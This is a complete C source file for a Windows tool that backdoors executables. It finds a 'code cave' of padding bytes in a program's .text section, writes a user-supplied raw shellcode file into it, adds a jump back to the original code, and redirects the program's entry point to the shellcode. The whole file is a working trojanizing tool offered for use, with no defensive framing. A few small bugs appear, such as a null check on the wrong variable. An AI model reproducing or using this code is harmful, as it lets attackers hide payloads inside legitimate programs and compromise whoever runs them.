#include <stdio.h>
#include <Windows.h>


typedef struct _CAVE_INFO
{
	PBYTE pStartAddress;
	PBYTE pEndAddress;
	DWORD dwSize;
	DWORD offset;
	DWORD rva;
} CAVE_INFO, * PCAVE_INFO;

int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer, CAVE_INFO *caveInfo)
{
	PBYTE pSectionStart = pBuffer + pSectionHeader->PointerToRawData;
	DWORD dwSectionSize = pSectionHeader->SizeOfRawData;
	printf("[+] Section start address: 0x%p\n", pSectionStart);

	PBYTE pStartAddress = NULL;
	PBYTE pEndAddress = NULL;

	DWORD caveSize = 0;
	PBYTE previousAddress = NULL;
	CAVE_INFO caveInfoArray[100] = {0};
	int caveIndex = 0;

	for (DWORD i = 0; i <= dwSectionSize; i++)
	{
		if (*(BYTE*)(pSectionStart + i) == 0xCC ||
			*(BYTE*)(pSectionStart + i) == 0x90 ||
			*(BYTE*)(pSectionStart + i) == 0x00)
		{
			previousAddress = pSectionStart + i;

			if (pStartAddress == NULL)
			{
				pStartAddress = pSectionStart + i;
			}
			else
			{
				caveSize++;
				pEndAddress = pSectionStart + i;
			}
		}
		else
		{
			if (caveSize >= 50 && caveIndex <= 99)
			{
				CAVE_INFO cave = {
					pStartAddress,
					pEndAddress,
					caveSize
				};
				printf("\033[0;32m[+] Discovered cave!\033[0m\n");
				printf("-> CAVE Start: %p\n", cave.pStartAddress);
				printf("-> CAVE End: %p\n", cave.pEndAddress);
				printf("-> CAVE Size: %d\n", cave.dwSize);
				caveInfoArray[caveIndex] = cave;
				caveIndex++;
			}

			pStartAddress = NULL;
			pEndAddress = NULL;
			caveSize = 0;
		}
	}

	printf("\033[0;32m[+] Found %d cave(s) in the section.\033[0m\n", caveIndex);
	printf("[+] Using largest cave\n");
	int largestCaveIndex = 0;
	DWORD largestCaveSize = 0;
	for (int i = 0; i < caveIndex; i++)
	{
		if (largestCaveSize == 0)
		{
			largestCaveSize = caveInfoArray[i].dwSize;
			largestCaveIndex = i;
			continue;
		}

		if (caveInfoArray[i].dwSize > largestCaveSize)
		{
			largestCaveSize = caveInfoArray[i].dwSize;
			largestCaveIndex = i;
		}
	}

	DWORD caveSectionOffset = (DWORD)(caveInfoArray[largestCaveIndex].pStartAddress - pSectionStart);
	DWORD caveFileOffset = pSectionHeader->PointerToRawData + caveSectionOffset;
	DWORD rva = pSectionHeader->VirtualAddress + (caveFileOffset - pSectionHeader->PointerToRawData);

	caveInfo->pStartAddress = caveInfoArray[largestCaveIndex].pStartAddress;
	caveInfo->pEndAddress = caveInfoArray[largestCaveIndex].pEndAddress;
	caveInfo->dwSize = caveInfoArray[largestCaveIndex].dwSize;
	caveInfo->offset = caveFileOffset;
	caveInfo->rva = rva;
	printf("-> Start Address: 0x%p\n", caveInfo->pStartAddress);
	printf("-> End Address: 0x%p\n", caveInfo->pEndAddress);
	printf("-> Size: %d bytes\n", caveInfo->dwSize);
	printf("-> Offset: 0x%04X\n", caveInfo->offset);
	printf("-> RVA: 0x%04X\n", caveInfo->rva);

	return 0;
}

BOOL generatePayload(DWORD originalEntryPoint, PCAVE_INFO pCaveInfo, PBYTE pCaveAddress, PBYTE payloadBuffer, DWORD payloadSize)
{

	printf("[+] Size of shellcode (+5): %d\n", payloadSize + 5);
	printf("[+] Size of cave: %d\n", pCaveInfo->dwSize);
	if (payloadSize + 5 > pCaveInfo->dwSize)
	{
		printf("\033[0;31m[!] Cave is too small for payload!\033[0m\n");
		return FALSE;
	}
	printf("[?] Proceed with backdooring PE? (y/n):\n");
	char response = getchar();
	if (tolower(response) != 'y')
	{
		return FALSE;
	}

	printf("[+] Adding shellcode to code cave\n");
	memcpy((void*)pCaveAddress, payloadBuffer, payloadSize);

	for (DWORD i = 0; i < payloadSize; i++)
	{
		if (i == payloadSize - 1)
		{
			printf("0x%02X\n", payloadBuffer[i]);
		}
		else
		{
			printf("0x%02X, ", payloadBuffer[i]);
		}
		if ((i + 1) % 12 == 0)
		{
			printf("\n");
		}
	}


	printf("[+] Adding patch back to original entrypoint RVA\n");
	DWORD jmpRVA = pCaveInfo->rva + payloadSize;
	LONG rel32 = (LONG)(originalEntryPoint - (jmpRVA + 5));

	pCaveAddress[payloadSize] = 0xE9; // jmp
	*(LONG*)(pCaveAddress + payloadSize + 1) = rel32;

	return TRUE;
}

void getPayloadBuffer(LPCSTR payloadFile, PBYTE *pPayloadBuffer, DWORD *pPayloadSize)
{
	printf("[+] Loading paylaod\n");

	HANDLE hPayload = CreateFileA(
		payloadFile,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hPayload == INVALID_HANDLE_VALUE)
	{
		printf("[*] Error opening shellcode: %d\n", GetLastError());
		return;
	}

	DWORD payloadSize = 0;
	payloadSize = GetFileSize(hPayload, NULL);

	PBYTE payloadBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payloadSize);
	if (pPayloadBuffer == NULL)
	{
		printf("[*] Error allocating memory for shellcode: %d\n", GetLastError());
		CloseHandle(hPayload);
		return;
	}

	DWORD dwBytesRead = 0;
	if (!ReadFile(hPayload, payloadBuffer, payloadSize, &dwBytesRead, NULL))
	{
		printf("[*] Error reading shellcode: %d\n", GetLastError());
		CloseHandle(hPayload);
		HeapFree(GetProcessHeap(), 0, payloadBuffer);
		return;
	}

	printf("[+] Read %d bytes into address space %p\n", dwBytesRead, payloadBuffer);

	*pPayloadBuffer = payloadBuffer;
	*pPayloadSize = payloadSize;
}

int main(int argc, char *argv[])
{
	if (argc != 3)
	{
		printf("Usage: %s <target binary> <raw_shellcode_file>\n", argv[0]);
		return 1;
	}

	DWORD dwBinaryType = 100;
	GetBinaryTypeA(argv[1], &dwBinaryType);

	PBYTE payloadBuffer = NULL;
	DWORD payloadSize = 0;

	getPayloadBuffer(argv[2], &payloadBuffer, &payloadSize);
	if (payloadBuffer == NULL)
	{
		printf("[*] Failed to get payload buffer.\n");
		return 1;
	}
	
	if (dwBinaryType != SCS_32BIT_BINARY)
	{
		printf("\033[33m[+] The file is a 64-bit binary. Ensure your shellcode is also x64.\033[0m\n");
	} 
	else
	{
		printf("\033[33m[+] The file is a 32-bit binary. Ensure your shellcode is also x86.\033[0m\n");
	}
	printf("[+] Press any key to continue\n");
	getchar();

	HANDLE hFile = CreateFileA(
		argv[1],
		GENERIC_READ | GENERIC_WRITE,
		0, NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("[*] Error opening file: %d\n", GetLastError());
		return 1;
	}

	HANDLE hMap = CreateFileMappingA(
		hFile,
		NULL,
		PAGE_READWRITE,
		0,
		0,
		NULL
	);
	if (hMap == NULL)
	{
		printf("[*] Error creating file mapping: %d\n", GetLastError());
		CloseHandle(hFile);
		return 1;
	}

	LPVOID pBuffer = MapViewOfFile(
		hMap,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		0
	);
	if (pBuffer == NULL)
	{
		printf("[*] Error mapping view of file: %d\n", GetLastError());
		CloseHandle(hMap);
		CloseHandle(hFile);
		return 1;
	}

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;
	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)pBuffer + pDosHeader->e_lfanew);
	DWORD originalEntryPoint = pNTHeaders->OptionalHeader.AddressOfEntryPoint;

	printf("[+] Buffer: 0x%p\n", (void*)pBuffer);
	printf("[+] Entry point RVA: 0x%04X\n", originalEntryPoint);

	PIMAGE_SECTION_HEADER sectionHeaders = IMAGE_FIRST_SECTION(pNTHeaders);


	CAVE_INFO caveInfo = { 0 };

	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++)
	{
		printf("[+] Section %d: %s\n", i + 1, sectionHeaders[i].Name);
		printf("    Virtual Address: 0x%08X\n", sectionHeaders[i].VirtualAddress);
		printf("    Size of Raw Data: 0x%08X\n", sectionHeaders[i].SizeOfRawData);
		printf("    Pointer to Raw Data: 0x%08X\n", sectionHeaders[i].PointerToRawData);
		if (strcmp((char*)sectionHeaders[i].Name, ".text") == 0)
		{
			printf("    [*] Found %s section!\n", sectionHeaders[i].Name);
			printf("    [*] Virtual Address: 0x%08X\n", sectionHeaders[i].VirtualAddress);
			printf("    [*] Size of Raw Data: 0x%08X\n", sectionHeaders[i].SizeOfRawData);
			printf("    [*] Pointer to Raw Data: 0x%08X\n", sectionHeaders[i].PointerToRawData);
			enumerateSection(&sectionHeaders[i], (PBYTE)pBuffer, &caveInfo);
		}
	}

	PBYTE caveAddress = (PBYTE)pBuffer + caveInfo.offset;

	if (!generatePayload(originalEntryPoint, &caveInfo, caveAddress, payloadBuffer, payloadSize))
	{
		UnmapViewOfFile(pBuffer);
		CloseHandle(hMap);
		CloseHandle(hFile);
		return 1;
	}

	printf("[+] Updating entrypoint to code cave RVA\n");
	pNTHeaders->OptionalHeader.AddressOfEntryPoint = caveInfo.rva;

	printf("[+] New entry point RVA: 0x%04X\n", pNTHeaders->OptionalHeader.AddressOfEntryPoint);


	printf("[+] Saving modifications\n");

	FlushViewOfFile(pBuffer, 0);
	UnmapViewOfFile(pBuffer);
	CloseHandle(hMap);
	CloseHandle(hFile);

	return 0;
}
